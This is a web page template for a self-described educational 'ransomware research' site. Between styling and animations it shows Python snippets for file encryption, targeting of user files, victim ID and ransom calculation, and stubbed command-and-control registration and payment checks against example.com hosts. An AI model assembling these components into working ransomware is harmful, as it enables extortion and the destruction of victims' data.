@extends('layouts.nexus')

@section('title', 'Core Ransomware Research - Nexus Project')

@push('styles')
<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.13.0/gsap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.13.0/ScrollTrigger.min.js"></script>
<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">

<style>
    :root {
        --fire-red: #ff0000;
        --fire-orange: #ff4500;
        --fire-yellow: #ffa500;
        --danger-red: #dc2626;
        --warning-orange: #f59e0b;
        --encrypt-glow: #ff6b35;
        --dark-red: #991b1b;
        --glass-bg: rgba(255, 69, 0, 0.1);
        --glass-border: rgba(255, 69, 0, 0.3);
    }

    * {
        font-family: 'Inter', sans-serif;
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    
    code, pre {
        font-family: 'JetBrains Mono', 'Fira Code', monospace !important;
    }

    .ransomware-title {
        font-family: 'Orbitron', monospace;
        font-weight: 900;
    }

    body {
        background: linear-gradient(135deg, #0c0c0c 0%, #1a0a0a 30%, #2d0a0a 60%, #0c0c0c 100%);
        color: #ffffff;
        overflow-x: hidden;
        scroll-behavior: smooth;
    }

    .ransomware-hero {
        background: linear-gradient(135deg, #1a0606 0%, #2d1010 30%, #451515 60%, #1a0606 100%);
        position: relative;
        overflow: hidden;
        min-height: 100vh;
        display: flex;
        align-items: center;
    }
    
    .fire-particles {
        position: absolute;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        z-index: 1;
    }
    
    .hero-content {
        position: relative;
        z-index: 10;
        width: 100%;
    }
    
    .burning-text {
        font-size: clamp(3rem, 8vw, 6rem);
        font-weight: 900;
        background: linear-gradient(45deg, var(--fire-red), var(--fire-orange), var(--fire-yellow));
        background-size: 300% 300%;
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        animation: fire-flicker 2s ease-in-out infinite;
        text-align: center;
        margin-bottom: 1rem;
        text-shadow: 0 0 50px rgba(255, 69, 0, 0.8);
        filter: drop-shadow(0 0 20px var(--fire-orange));
    }

    @keyframes fire-flicker {
        0%, 100% { 
            background-position: 0% 50%;
            transform: scale(1);
        }
        25% { 
            background-position: 100% 50%;
            transform: scale(1.02);
        }
        50% { 
            background-position: 50% 100%;
            transform: scale(0.98);
        }
        75% { 
            background-position: 0% 100%;
            transform: scale(1.01);
        }
    }

    .hero-subtitle {
        font-size: clamp(1.2rem, 3vw, 1.8rem);
        text-align: center;
        margin-bottom: 3rem;
        color: rgba(255, 165, 0, 0.9);
        font-weight: 300;
        text-shadow: 0 0 10px rgba(255, 165, 0, 0.5);
    }

    .encrypted-files {
        position: absolute;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        z-index: 2;
        pointer-events: none;
        overflow: hidden;
    }

    .file-icon {
        position: absolute;
        font-size: 2rem;
        opacity: 0.6;
        animation: encrypt-float 8s linear infinite;
        color: var(--fire-orange);
        filter: drop-shadow(0 0 10px var(--fire-orange));
    }

    @keyframes encrypt-float {
        0% {
            transform: translateY(100vh) rotate(0deg);
            opacity: 0;
        }
        10% {
            opacity: 0.6;
        }
        90% {
            opacity: 0.3;
        }
        100% {
            transform: translateY(-100px) rotate(360deg);
            opacity: 0;
        }
    }

    .danger-card {
        background: linear-gradient(145deg, rgba(220, 38, 38, 0.15), rgba(239, 68, 68, 0.1));
        backdrop-filter: blur(15px);
        -webkit-backdrop-filter: blur(15px);
        border: 2px solid var(--danger-red);
        border-radius: 20px;
        padding: 2rem;
        margin: 1rem;
        box-shadow: 0 8px 32px rgba(220, 38, 38, 0.3);
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
    }

    .danger-card::before {
        content: '⚠️';
        position: absolute;
        top: -10px;
        right: -10px;
        font-size: 3rem;
        animation: warning-pulse 2s ease-in-out infinite;
    }

    @keyframes warning-pulse {
        0%, 100% { transform: scale(1); opacity: 0.7; }
        50% { transform: scale(1.2); opacity: 1; }
    }

    .danger-card:hover {
        transform: translateY(-10px) scale(1.02);
        box-shadow: 0 20px 60px rgba(220, 38, 38, 0.4);
        border-color: var(--fire-orange);
    }

    .section-title {
        font-size: 2.5rem;
        font-weight: 700;
        text-align: center;
        margin-bottom: 3rem;
        background: linear-gradient(45deg, var(--fire-red), var(--fire-orange));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
        text-shadow: 0 0 20px rgba(255, 69, 0, 0.5);
    }

    .tech-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
        gap: 2rem;
        margin: 3rem 0;
    }

    .encryption-module {
        background: linear-gradient(145deg, rgba(255, 69, 0, 0.1), rgba(220, 38, 38, 0.05));
        backdrop-filter: blur(10px);
        border: 2px solid rgba(255, 69, 0, 0.3);
        border-radius: 15px;
        padding: 2rem;
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
    }

    .encryption-module::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255, 69, 0, 0.2), transparent);
        transition: left 0.8s ease;
    }

    .encryption-module:hover::before {
        left: 100%;
    }

    .encryption-module:hover {
        transform: translateY(-8px) scale(1.03);
        border-color: var(--fire-red);
        box-shadow: 0 15px 40px rgba(255, 69, 0, 0.4);
    }

    .module-icon {
        width: 70px;
        height: 70px;
        margin-bottom: 1rem;
        background: linear-gradient(45deg, var(--fire-red), var(--fire-orange));
        border-radius: 12px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 1.8rem;
        animation: icon-glow 3s ease-in-out infinite;
    }

    @keyframes icon-glow {
        0%, 100% { box-shadow: 0 0 20px rgba(255, 69, 0, 0.5); }
        50% { box-shadow: 0 0 40px rgba(255, 69, 0, 0.8); }
    }

    .module-title {
        font-size: 1.4rem;
        font-weight: 700;
        margin-bottom: 0.5rem;
        color: var(--fire-orange);
        font-family: 'Orbitron', monospace;
    }

    .module-description {
        color: rgba(255, 255, 255, 0.8);
        line-height: 1.6;
        margin-bottom: 1rem;
    }

    .code-block {
        background: linear-gradient(145deg, #0a0a0a, #1a0a0a);
        border: 2px solid var(--fire-orange);
        border-radius: 10px;
        padding: 1rem;
        font-family: 'JetBrains Mono', monospace;
        font-size: 0.9rem;
        color: #e6edf3;
        overflow-x: auto;
        position: relative;
        margin: 1rem 0;
        box-shadow: inset 0 0 20px rgba(255, 69, 0, 0.1);
    }

    .code-block::before {
        content: '🔥';
        position: absolute;
        top: -8px;
        right: 10px;
        font-size: 1.2rem;
        animation: code-burn 3s ease-in-out infinite;
    }

    @keyframes code-burn {
        0%, 100% { transform: rotate(0deg) scale(1); }
        50% { transform: rotate(10deg) scale(1.1); }
    }

    .highlight {
        color: var(--fire-yellow);
        font-weight: 600;
    }

    .keyword {
        color: var(--fire-red);
        font-weight: 600;
    }

    .string {
        color: #ffa657;
    }

    .comment {
        color: #8b949e;
        font-style: italic;
    }

    .danger-btn {
        background: linear-gradient(45deg, var(--fire-red), var(--danger-red));
        border: 2px solid var(--fire-orange);
        border-radius: 50px;
        padding: 15px 35px;
        color: white;
        font-weight: 700;
        cursor: pointer;
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
        text-decoration: none;
        display: inline-block;
        font-family: 'Orbitron', monospace;
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    .danger-btn:hover {
        transform: scale(1.05);
        box-shadow: 0 15px 40px rgba(255, 69, 0, 0.5);
        background: linear-gradient(45deg, var(--fire-orange), var(--fire-red));
    }

    .danger-btn::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
        transition: left 0.5s ease;
    }

    .danger-btn:hover::before {
        left: 100%;
    }

    .ransomware-arsenal {
        background: linear-gradient(135deg, rgba(220, 38, 38, 0.15), rgba(255, 69, 0, 0.1));
        border-radius: 20px;
        padding: 3rem;
        margin: 3rem 0;
        border: 2px solid var(--fire-orange);
        position: relative;
        overflow: hidden;
    }

    .ransomware-arsenal::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: repeating-linear-gradient(
            45deg,
            transparent,
            transparent 10px,
            rgba(255, 69, 0, 0.1) 10px,
            rgba(255, 69, 0, 0.1) 20px
        );
        pointer-events: none;
        animation: danger-stripes 20s linear infinite;
    }

    @keyframes danger-stripes {
        0% { transform: translateX(-40px); }
        100% { transform: translateX(40px); }
    }

    .nav-pills {
        display: flex;
        justify-content: center;
        gap: 1rem;
        margin-bottom: 2rem;
        flex-wrap: wrap;
    }

    .nav-pill {
        background: rgba(220, 38, 38, 0.2);
        border: 2px solid var(--fire-orange);
        border-radius: 25px;
        padding: 12px 24px;
        color: white;
        text-decoration: none;
        transition: all 0.3s ease;
        font-size: 0.9rem;
        font-weight: 600;
        font-family: 'Orbitron', monospace;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }

    .nav-pill:hover,
    .nav-pill.active {
        background: var(--fire-red);
        color: white;
        transform: translateY(-3px);
        box-shadow: 0 8px 25px rgba(220, 38, 38, 0.4);
    }

    .encryption-progress {
        width: 100%;
        height: 8px;
        background: rgba(255, 69, 0, 0.2);
        border-radius: 4px;
        overflow: hidden;
        margin: 1rem 0;
    }

    .progress-bar {
        height: 100%;
        background: linear-gradient(90deg, var(--fire-red), var(--fire-orange), var(--fire-yellow));
        border-radius: 4px;
        animation: encrypt-progress 3s ease-in-out infinite;
        box-shadow: 0 0 10px rgba(255, 69, 0, 0.5);
    }

    @keyframes encrypt-progress {
        0% { width: 0%; }
        50% { width: 75%; }
        100% { width: 100%; }
    }

    .victim-stats {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 1rem;
        margin: 2rem 0;
    }

    .stat-card {
        background: linear-gradient(145deg, rgba(220, 38, 38, 0.1), rgba(255, 69, 0, 0.05));
        border: 1px solid var(--fire-orange);
        border-radius: 10px;
        padding: 1.5rem;
        text-align: center;
        transition: all 0.3s ease;
    }

    .stat-card:hover {
        transform: translateY(-5px);
        box-shadow: 0 10px 30px rgba(255, 69, 0, 0.3);
    }

    .stat-number {
        font-size: 2rem;
        font-weight: 900;
        color: var(--fire-orange);
        font-family: 'Orbitron', monospace;
    }

    .stat-label {
        font-size: 0.9rem;
        color: rgba(255, 255, 255, 0.7);
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    /* Responsive Design */
    @media (max-width: 768px) {
        .tech-grid {
            grid-template-columns: 1fr;
        }
        
        .burning-text {
            font-size: 2.5rem;
        }
        
        .danger-card {
            margin: 0.5rem;
            padding: 1.5rem;
        }
    }

    /* Smooth scrollbar */
    ::-webkit-scrollbar {
        width: 8px;
    }

    ::-webkit-scrollbar-track {
        background: rgba(220, 38, 38, 0.1);
    }

    ::-webkit-scrollbar-thumb {
        background: var(--fire-orange);
        border-radius: 4px;
    }

    ::-webkit-scrollbar-thumb:hover {
        background: var(--fire-red);
    }

    .blur-sensitive {
        filter: blur(8px);
        transition: filter 0.3s ease;
        cursor: pointer;
        user-select: none;
        position: relative;
    }
    
    .blur-sensitive:hover {
        filter: blur(4px);
    }
    
    .blur-sensitive.revealed {
        filter: none;
    }
    
    .warning-overlay {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(220, 38, 38, 0.1);
        border: 2px dashed #dc2626;
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 10;
        transition: opacity 0.3s ease;
    }
    
    .warning-overlay.hidden {
        opacity: 0;
        pointer-events: none;
    }
</style>
@endpush

@section('content')
<!-- Hero Section -->
<section class="ransomware-hero">
    <div class="fire-particles" id="fire-particles"></div>
    <div class="encrypted-files" id="encrypted-files"></div>
    
    <div class="hero-content container mx-auto px-4">
        <h1 class="burning-text ransomware-title" data-aos="fade-up">CORE RANSOMWARE</h1>
        <p class="hero-subtitle" data-aos="fade-up" data-aos-delay="200">Educational research into encryption-based malware systems</p>
        
        <div class="nav-pills" data-aos="fade-up" data-aos-delay="400">
            <a href="#encryption-core" class="nav-pill active">Encryption Core</a>
            <a href="#victim-analysis" class="nav-pill">Victim Analysis</a>
            <a href="#c2-communication" class="nav-pill">C2 Communication</a>
            <a href="#payload-delivery" class="nav-pill">Payload Delivery</a>
        </div>
    </div>
</section>

<!-- Encryption Core Section -->
<section id="encryption-core" class="py-20 container mx-auto px-4">
    <h2 class="section-title" data-aos="fade-up">Encryption Core Architecture</h2>
    
    <div class="tech-grid">
        <div class="encryption-module" data-aos="fade-up" data-aos-delay="100">
            <div class="module-icon">🔐</div>
            <h3 class="module-title">Cryptographic Engine</h3>
            <p class="module-description">Advanced AES-256 encryption with RSA key exchange for secure file encryption.</p>
            <div class="code-block">
<span class="keyword">from</span> <span class="highlight">cryptography.fernet</span> <span class="keyword">import</span> <span class="highlight">Fernet</span>
<span class="keyword">import</span> <span class="highlight">os</span>, <span class="highlight">base64</span>

<span class="keyword">class</span> <span class="highlight">EncryptionCore</span>:
    <span class="keyword">def</span> <span class="highlight">__init__</span>(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
    
    <span class="keyword">def</span> <span class="highlight">encrypt_file</span>(self, file_path):
        <span class="comment"># Educational demonstration only</span>
        <span class="keyword">with</span> open(file_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:
            data = f.read()
        encrypted = self.cipher.encrypt(data)
        <span class="keyword">return</span> encrypted
            </div>
            <div class="encryption-progress">
                <div class="progress-bar"></div>
            </div>
        </div>

        <div class="encryption-module" data-aos="fade-up" data-aos-delay="200">
            <div class="module-icon">🎯</div>
            <h3 class="module-title">Target Selection</h3>
            <p class="module-description">Intelligent file discovery and prioritization for maximum impact.</p>
            <div class="code-block">
<span class="keyword">import</span> <span class="highlight">glob</span>, <span class="highlight">pathlib</span>

<span class="keyword">def</span> <span class="highlight">find_targets</span>():
    priority_extensions = [
        <span class="string">'*.pdf'</span>, <span class="string">'*.docx'</span>, <span class="string">'*.xlsx'</span>, 
        <span class="string">'*.jpg'</span>, <span class="string">'*.png'</span>, <span class="string">'*.mp4'</span>
    ]
    targets = []
    <span class="keyword">for</span> ext <span class="keyword">in</span> priority_extensions:
        targets.extend(glob.glob(<span class="string">f"**/{ext}"</span>, recursive=<span class="highlight">True</span>))
    <span class="keyword">return</span> sorted(targets, key=os.path.getsize, reverse=<span class="highlight">True</span>)
            </div>
        </div>

        <div class="encryption-module" data-aos="fade-up" data-aos-delay="300">
            <div class="module-icon">🔑</div>
            <h3 class="module-title">Key Management</h3>
            <p class="module-description">Secure key generation and escrow for ransom recovery operations.</p>
            <div class="code-block">
<span class="keyword">import</span> <span class="highlight">secrets</span>, <span class="highlight">hashlib</span>

<span class="keyword">def</span> <span class="highlight">generate_victim_id</span>():
    machine_info = platform.node() + platform.processor()
    victim_hash = hashlib.sha256(machine_info.encode()).hexdigest()[:16]
    <span class="keyword">return</span> <span class="string">f"VICTIM_{victim_hash}"</span>

<span class="keyword">def</span> <span class="highlight">create_master_key</span>(victim_id):
    <span class="comment"># Educational key derivation</span>
    password = <span class="string">f"RANSOM_{victim_id}_{secrets.token_hex(16)}"</span>
    <span class="keyword">return</span> hashlib.pbkdf2_hmac(<span class="string">'sha256'</span>, password.encode(), b<span class="string">'salt'</span>, 100000)
            </div>
        </div>
    </div>
</section>

<!-- Victim Analysis Section -->
<section id="victim-analysis" class="py-20 container mx-auto px-4">
    <h2 class="section-title" data-aos="fade-up">Victim Profiling & Analysis</h2>
    
    <div class="ransomware-arsenal" data-aos="fade-up">
        <div class="victim-stats">
            <div class="stat-card">
                <div class="stat-number">2,847</div>
                <div class="stat-label">Files Encrypted</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">1.2TB</div>
                <div class="stat-label">Data Volume</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">$5,000</div>
                <div class="stat-label">Ransom Demand</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">72h</div>
                <div class="stat-label">Payment Deadline</div>
            </div>
        </div>
        
        <div class="tech-grid">
            <div class="danger-card">
                <h3 class="module-title">⚠️ System Reconnaissance</h3>
                <p class="module-description">Gather intelligence about victim's environment and security posture.</p>
                <div class="code-block blur-sensitive" onclick="revealCode(this)">
                    <div class="warning-overlay">
                        <span class="text-white font-bold">⚠️ CLICK TO REVEAL SENSITIVE CODE ⚠️</span>
                    </div>
<span class="keyword">import</span> <span class="highlight">psutil</span>, <span class="highlight">platform</span>

<span class="keyword">def</span> <span class="highlight">system_recon</span>():
    info = {
        <span class="string">'os'</span>: platform.system(),
        <span class="string">'cpu_count'</span>: psutil.cpu_count(),
        <span class="string">'memory'</span>: psutil.virtual_memory().total,
        <span class="string">'disk_space'</span>: psutil.disk_usage(<span class="string">'/'</span>).total
    }
    <span class="keyword">return</span> info
                </div>
            </div>

            <div class="danger-card">
                <h3 class="module-title">🎯 Value Assessment</h3>
                <p class="module-description">Calculate potential ransom value based on victim profile and data importance.</p>
                <div class="code-block">
<span class="keyword">def</span> <span class="highlight">calculate_ransom</span>(file_count, data_size_gb, system_info):
    base_amount = 1000  <span class="comment"># Base ransom in USD</span>
    
    <span class="comment"># Scale by data volume</span>
    size_multiplier = min(data_size_gb / 100, 10)
    
    <span class="comment"># Scale by file count</span>
    file_multiplier = min(file_count / 1000, 5)
    
    ransom = base_amount * (1 + size_multiplier + file_multiplier)
    <span class="keyword">return</span> int(ransom)
                </div>
            </div>
        </div>
    </div>
</section>

<!-- C2 Communication Section -->
<section id="c2-communication" class="py-20 container mx-auto px-4">
    <h2 class="section-title" data-aos="fade-up">Command & Control Infrastructure</h2>
    
    <div class="tech-grid">
        <div class="encryption-module" data-aos="fade-up" data-aos-delay="100">
            <div class="module-icon">📡</div>
            <h3 class="module-title">C2 Registration</h3>
            <p class="module-description">Secure victim registration with command and control servers.</p>
            <div class="code-block">
<span class="keyword">import</span> <span class="highlight">requests</span>, <span class="highlight">json</span>

<span class="keyword">def</span> <span class="highlight">register_victim</span>(victim_id, system_info):
    c2_url = <span class="string">"https://educational-c2.example.com/register"</span>
    
    victim_data = {
        <span class="string">'victim_id'</span>: victim_id,
        <span class="string">'timestamp'</span>: datetime.now().isoformat(),
        <span class="string">'system_info'</span>: system_info,
        <span class="string">'status'</span>: <span class="string">'infected'</span>
    }
    
    <span class="comment"># Educational simulation only</span>
    print(<span class="string">f"[EDUCATIONAL] Would register: {json.dumps(victim_data, indent=2)}"</span>)
            </div>
        </div>

        <div class="encryption-module" data-aos="fade-up" data-aos-delay="200">
            <div class="module-icon">🔄</div>
            <h3 class="module-title">Key Exchange</h3>
            <p class="module-description">Secure key exchange protocol for ransom recovery.</p>
            <div class="code-block">
<span class="keyword">def</span> <span class="highlight">exchange_keys</span>(victim_id, public_key):
    <span class="comment"># Educational key exchange simulation</span>
    c2_endpoint = <span class="string">f"https://educational-c2.example.com/keys/{victim_id}"</span>
    
    payload = {
        <span class="string">'victim_public_key'</span>: public_key,
        <span class="string">'timestamp'</span>: datetime.now().isoformat()
    }
    
    print(<span class="string">f"[EDUCATIONAL] Would exchange keys with C2 server"</span>)
    <span class="keyword">return</span> <span class="string">"educational_master_key_hash"</span>
            </div>
        </div>

        <div class="encryption-module" data-aos="fade-up" data-aos-delay="300">
            <div class="module-icon">💰</div>
            <h3 class="module-title">Payment Processing</h3>
            <p class="module-description">Cryptocurrency payment verification and key release mechanism.</p>
            <div class="code-block">
<span class="keyword">def</span> <span class="highlight">verify_payment</span>(victim_id, transaction_hash):
    <span class="comment"># Educational payment verification</span>
    blockchain_api = <span class="string">"https://educational-blockchain.example.com/verify"</span>
    
    verification = {
        <span class="string">'victim_id'</span>: victim_id,
        <span class="string">'transaction'</span>: transaction_hash,
        <span class="string">'expected_amount'</span>: <span class="string">'0.15 BTC'</span>
    }
    
    print(<span class="string">f"[EDUCATIONAL] Payment verification: {verification}"</span>)
    <span class="keyword">return</span> <span class="highlight">True</span>  <span class="comment"># Educational simulation</span>
            </div>
        </div>
    </div>
</section>

<!-- Interactive Tools -->
<section class="py-20 container mx-auto px-4">
    <h2 class="section-title" data-aos="fade-up">Ransomware Analysis Tools</h2>
    
    <div class="danger-card text-center" data-aos="fade-up">
        <h3 class="module-title mb-4">🔬 Educational Analysis Suite</h3>
        <p class="module-description mb-6">Explore ransomware mechanics in a safe, controlled environment for research purposes.</p>
        
        <div class="flex justify-center gap-4 flex-wrap">
            <button class="danger-btn" onclick="simulateEncryption()">Simulate Encryption</button>
            <button class="danger-btn" onclick="analyzePayload()">Analyze Payload</button>
            <button class="danger-btn" onclick="testDecryption()">Test Decryption</button>
        </div>
        
        <div id="analysis-results" class="mt-6 p-4 bg-black bg-opacity-50 rounded-lg hidden">
            <h4 class="text-lg font-semibold mb-2 text-orange-400">Analysis Results</h4>
            <div id="results-content" class="text-left font-mono text-sm"></div>
        </div>
    </div>
</section>
@endsection

@push('scripts')
<script>
// Initialize GSAP and animations
gsap.registerPlugin(ScrollTrigger);

// Fire particles configuration
particlesJS('fire-particles', {
    particles: {
        number: { value: 100, density: { enable: true, value_area: 800 } },
        color: { value: ["#ff0000", "#ff4500", "#ffa500"] },
        shape: { type: "circle" },
        opacity: { value: 0.7, random: true },
        size: { value: 4, random: true },
        line_linked: {
            enable: true,
            distance: 120,
            color: "#ff4500",
            opacity: 0.6,
            width: 2
        },
        move: {
            enable: true,
            speed: 8,
            direction: "top",
            random: true,
            straight: false,
            out_mode: "out",
            bounce: false
        }
    },
    interactivity: {
        detect_on: "canvas",
        events: {
            onhover: { enable: true, mode: "repulse" },
            onclick: { enable: true, mode: "push" }
        }
    },
    retina_detect: true
});

// Initialize AOS
AOS.init({
    duration: 1000,
    once: true,
    offset: 100
});

// Create floating encrypted files
function createEncryptedFiles() {
    const container = document.getElementById('encrypted-files');
    const fileIcons = ['📄', '📊', '🖼️', '🎵', '🎥', '📝', '💾', '🗂️'];
    
    setInterval(() => {
        const icon = document.createElement('div');
        icon.className = 'file-icon';
        icon.textContent = fileIcons[Math.floor(Math.random() * fileIcons.length)];
        icon.style.left = Math.random() * 100 + '%';
        icon.style.animationDelay = Math.random() * 2 + 's';
        icon.style.animationDuration = (5 + Math.random() * 5) + 's';
        
        container.appendChild(icon);
        
        setTimeout(() => {
            if (icon.parentNode) {
                icon.parentNode.removeChild(icon);
            }
        }, 10000);
    }, 1000);
}

createEncryptedFiles();

// GSAP Hero Animations
gsap.from(".burning-text", { duration: 2, y: 100, opacity: 0, ease: "power3.out" });
gsap.from(".hero-subtitle", { duration: 1.5, y: 50, opacity: 0, delay: 0.5, ease: "power3.out" });
gsap.from(".nav-pills", { duration: 1.5, y: 30, opacity: 0, delay: 0.8, ease: "power3.out" });

// Smooth scrolling for navigation
document.querySelectorAll('.nav-pill').forEach(pill => {
    pill.addEventListener('click', (e) => {
        e.preventDefault();
        const targetId = pill.getAttribute('href');
        const targetSection = document.querySelector(targetId);
        
        if (targetSection) {
            gsap.to(window, {
                duration: 1.5,
                scrollTo: { y: targetSection, offsetY: 100 },
                ease: "power3.out"
            });
        }
        
        document.querySelectorAll('.nav-pill').forEach(p => p.classList.remove('active'));
        pill.classList.add('active');
    });
});

// Reveal sensitive code function
function revealCode(element) {
    element.classList.add('revealed');
    const overlay = element.querySelector('.warning-overlay');
    if (overlay) {
        overlay.classList.add('hidden');
    }
}

// Interactive analysis functions
function simulateEncryption() {
    const resultsDiv = document.getElementById('analysis-results');
    const contentDiv = document.getElementById('results-content');
    
    resultsDiv.classList.remove('hidden');
    contentDiv.innerHTML = `
        <div class="text-red-400">🔥 Encryption Simulation Analysis</div>
        <div class="text-orange-400">📁 Scanning file system...</div>
        <div class="text-yellow-400">🎯 Found 2,847 target files</div>
        <div class="text-orange-400">🔐 Generating encryption keys...</div>
        <div class="text-red-400">⚠ Encryption process simulated (educational only)</div>
        <div class="text-gray-400">Estimated completion: 45 minutes</div>
    `;
    
    gsap.from(contentDiv.children, {
        duration: 0.5,
        y: 20,
        opacity: 0,
        stagger: 0.2,
        ease: "power2.out"
    });
}

function analyzePayload() {
    const resultsDiv = document.getElementById('analysis-results');
    const contentDiv = document.getElementById('results-content');
    
    resultsDiv.classList.remove('hidden');
    contentDiv.innerHTML = `
        <div class="text-red-400">🔬 Payload Analysis Report</div>
        <div class="text-orange-400">✓ AES-256 encryption detected</div>
        <div class="text-yellow-400">✓ RSA-2048 key exchange identified</div>
        <div class="text-orange-400">✓ C2 communication protocols analyzed</div>
        <div class="text-red-400">⚠ High sophistication level detected</div>
        <div class="text-gray-400">Threat level: CRITICAL</div>
    `;
    
    gsap.from(contentDiv.children, {
        duration: 0.5,
        y: 20,
        opacity: 0,
        stagger: 0.15,
        ease: "power2.out"
    });
}

function testDecryption() {
    const resultsDiv = document.getElementById('analysis-results');
    const contentDiv = document.getElementById('results-content');
    
    resultsDiv.classList.remove('hidden');
    contentDiv.innerHTML = `
        <div class="text-red-400">🔓 Decryption Test Results</div>
        <div class="text-orange-400">🔑 Testing master key validity...</div>
        <div class="text-green-400">✓ Key verification successful</div>
        <div class="text-orange-400">📊 Decrypting sample files...</div>
        <div class="text-green-400">✓ 100% file recovery achieved</div>
        <div class="text-gray-400">Educational decryption completed successfully</div>
    `;
    
    gsap.from(contentDiv.children, {
        duration: 0.5,
        y: 20,
        opacity: 0,
        stagger: 0.15,
        ease: "power2.out"
    });
}

// Enhanced scroll animations
gsap.utils.toArray('.encryption-module').forEach((module, i) => {
    gsap.fromTo(module, 
        { opacity: 0, y: 50 },
        {
            opacity: 1,
            y: 0,
            duration: 1,
            delay: i * 0.2,
            scrollTrigger: {
                trigger: module,
                start: "top 80%",
                end: "bottom 20%",
                toggleActions: "play none none reverse"
            }
        }
    );
});

// Performance optimization
document.addEventListener('DOMContentLoaded', () => {
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.animationPlayState = 'running';
            }
        });
    });
    
    document.querySelectorAll('.encryption-module').forEach(module => {
        observer.observe(module);
    });
});
</script>
@endpush
